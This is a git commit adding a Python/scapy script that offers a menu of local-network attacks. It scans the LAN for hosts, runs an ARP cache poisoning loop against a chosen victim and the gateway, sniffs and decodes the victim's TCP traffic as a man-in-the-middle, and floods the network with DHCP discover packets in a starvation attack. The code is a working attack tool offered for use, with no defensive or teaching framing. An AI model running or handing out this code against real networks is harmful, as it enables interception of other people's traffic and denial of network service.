c0ec819f08a307b02b3b467e58511589bccad22e
ugurcanarikan <ugurcanarikan95@gmail.com>
2018-11-30 13:29:57 +0300

    getting online host ips and macs, poisoning arp cache of the target and the gateway, performing man-in-the-midle, some parts of the starvation attack

---
+++ main.py
@@ -0,0 +1,110 @@
+from scapy.all import *
+import os
+import signal
+import sys
+import threading
+import time
+import subprocess
+
+self_ip = str(subprocess.check_output("ipconfig getifaddr en0", shell=True))[2:-3]
+lan = self_ip.split(".")
+lan = lan[0] + "." + lan[1] + "." + lan[2]
+nmap_broadcast = lan + ".1/24"
+gateway_ip = ""
+gateway_mac = ""
+packet_count = 1000
+hosts = dict()
+
+def get_hosts():
+	print("finding all the hosts in the lan")
+	global nmap_broadcast
+	subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
+	arp_result = subprocess.check_output("arp -a", shell=True)
+	if arp_result == "":
+		print("no online hosts were find or internet connection is lost")
+		return
+	arp_result = arp_result.decode().split('\n')
+	del arp_result[-1]
+	for host in arp_result:
+		host = host.split(" ")
+		if host[3] == "(incomplete)":
+			continue
+		global hosts
+		hosts[host[1][1:-1]] = host[3]
+	global gateway_ip
+	gateway_ip = list(hosts.keys())[0][1:-1]
+	global gateway_mac
+	gateway_mac = list(hosts.values())[0]
+
+def arp_poison(target_ip):
+	print(target_ip)
+	global gateway_mac, gateway_ip
+	if gateway_ip == "" or gateway_mac == "":
+		get_hosts()
+	print("starting the mitm attack")
+	try:
+		while True:
+			send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+			send(ARP(op=2, pdst=target_ip, hwdst=hosts[target_ip], psrc=gateway_ip))
+			time.sleep(2)
+	except Exception as e:
+		print(e)
+
+def mitm_callback(pkt):
+    #pkt.show()
+    ret = pkt[0][1].src + " - " + pkt[0][1].dst + "\n"
+    if hasattr(pkt[0][2], "load"):
+    	try:
+    		ret =  ret + pkt[0][2].load.decode()
+    	except Exception as e:
+    		print(e)
+    return ret
+
+def starvation_attack():
+	conf.checkIPaddr = False
+	dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
+	sendp(dhcp_discover,loop=1)
+
+def starvation_callback(pkt):
+	pkt.show()
+
+while 1:
+	print("select from below options")
+	print("1 get online hosts")
+	print("2 mitm")
+	print("3 dos")
+	print("4 starvation attack")
+	option = input()
+	if option == "1":
+		get_hosts()
+		for key, value in hosts.items():
+			if key == gateway_ip and value == gateway_mac:
+				print(key + " at " + value + " as gateway")
+				continue
+			print(key + " at " + value)
+		print()
+	elif option == "2":
+		print("enter the ip of the victim")
+		target_ip = input()
+		if target_ip == self_ip:
+			print("cannot attack yourself")
+			print()
+			continue
+		else:
+			poison_thread = threading.Thread(target=arp_poison, args=target_ip)
+			poison_thread.start()
+			sniff_filter = "ip host " + target_ip
+			print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
+			#packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
+			packets = sniff(iface="en0", prn=mitm_callback, filter="tcp", store=0)
+			wrpcap(target_ip + "_capture.pcap", packets)
+	elif option == "3":
+		continue
+	elif option == "4":
+		print("starvation attack starting")
+		starvation_thread = threading.Thread(target=starvation_attack)
+		starvation_thread.start()
+		packets = sniff(iface="en0", prn=starvation_callback, filter="udp", store=0)
+
+
+
